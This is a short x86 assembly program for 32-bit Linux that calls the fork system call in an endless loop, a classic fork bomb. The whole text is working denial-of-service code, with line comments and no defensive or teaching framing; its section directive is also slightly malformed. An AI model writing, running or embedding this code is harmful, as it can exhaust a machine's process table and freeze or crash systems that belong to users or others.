section.text:
  global _start

_start:
  mov eax, 2  ; syscall code for fork
  int 0x80    ; interrupt code for syscall
  jmp _start  ; jump back to start and repeat